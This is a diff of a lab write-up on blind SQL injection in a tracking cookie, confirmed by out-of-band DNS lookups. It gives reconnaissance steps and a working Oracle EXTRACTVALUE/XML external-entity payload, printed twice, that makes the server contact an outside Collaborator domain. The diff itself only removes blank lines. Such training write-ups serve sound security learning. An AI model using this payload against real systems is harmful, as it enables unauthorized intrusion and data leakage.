@@ -10,7 +10,6 @@ The app is vulnerable to SQL injection via its tracking cookie. The `TrackingId`
 ## Reconnaissance
 
 When interacting with the application, the server issues a `TrackingId` cookie. Subjecting this cookie to standard SQLi checks reveals the following:
-
 - Injecting standard string terminators (`'`, `''`) gives identical `200 OK` HTTP Response, ruling out straightforward error-based SQLi
 - Injecting boolean conditions (`' AND 1=1--` vs `' AND 1=0--`) results in identical HTTP 200 OK responses with no variations in content length or DOM structure, ruling out boolean-based blind SQLi.
 - Injecting time-delay payloads also yields no difference in server response times, indicating the query is likely executed asynchronously in a separate background thread.
@@ -20,7 +19,6 @@ When interacting with the application, the server issues a `TrackingId` cookie. 
 2. In Burp Suite, on the **Collaborator** tab, click on **Copy to clipboard**. This will generate you a unique subdomain and poll the Collaborator server to confirm whenever a lookup occur. Paste this domain somewhere to use later. Note that you will need to change the suffix to `burpcollaborator.net` to fulfill the lab requirement (using Burp Collaborator's default public server)
 3. Inject the payload `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3Fxml+version%3D"1.0"+encoding%3D"UTF-8"%3F><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3A//yourdomainstring.burpcollaborator.net">+%25remote%3B]>'),'/l')+FROM dual--` into the `TrackingId` cookie field. The HTTP response will be a `200 OK`. 
 4. Come back to the **Collaborator** tab. Click on **Poll now**. You should see some DNS lookups received by the Collaborator subdomain that you generated earlier, confirming OAST SQLi. Lab is solved!
-
 ## Payload Used
 
 `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3Fxml+version%3D"1.0"+encoding%3D"UTF-8"%3F><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3A//yourdomainstring.burpcollaborator.net">+%25remote%3B]>'),'/l')+FROM dual--`
